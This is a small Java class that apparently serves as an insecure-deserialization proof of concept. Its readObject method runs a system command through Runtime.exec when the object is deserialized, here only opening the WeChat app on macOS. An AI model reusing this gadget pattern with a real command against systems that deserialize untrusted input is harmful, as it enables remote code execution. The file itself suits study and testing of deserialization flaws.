package com.seckeep.tool;

import java.io.IOException;
import java.io.Serializable;

public class MyObject implements Serializable
{

    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException
    {

    in.defaultReadObject();

    Runtime.getRuntime().exec("open /Applications/WeChat.app");
    }
}
